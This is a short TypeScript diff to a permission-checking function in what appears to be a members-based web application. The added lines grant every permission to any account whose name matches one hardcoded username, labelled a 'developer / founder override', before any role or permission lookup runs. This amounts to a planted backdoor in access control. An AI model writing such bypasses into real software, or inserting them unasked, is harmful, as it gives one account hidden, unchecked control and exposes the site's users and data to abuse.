@@ -42,9 +42,12 @@ function verifyPassword(password: string, storedHash: string): boolean {
 // -------------------------------------------------------------
 async function checkPermission(userId: number, actionKey: string): Promise<boolean> {
   try {
-    const userRows = await query<any[]>('SELECT role, rank_name FROM members WHERE id = ?', [userId]);
+    const userRows = await query<any[]>('SELECT role, rank_name, name FROM members WHERE id = ?', [userId]);
     if (userRows.length === 0) return false;
-    const { role: userRole, rank_name: userRank } = userRows[0];
+    const { role: userRole, rank_name: userRank, name: userName } = userRows[0];
+
+    // Explicit developer / founder override
+    if (userName && userName.toLowerCase() === 'gusgus95mx') return true;
 
     const rows = await query<any[]>('SELECT min_role FROM permissions WHERE action_key = ?', [actionKey]);
     if (rows.length === 0) return userRole === 'OWNER';
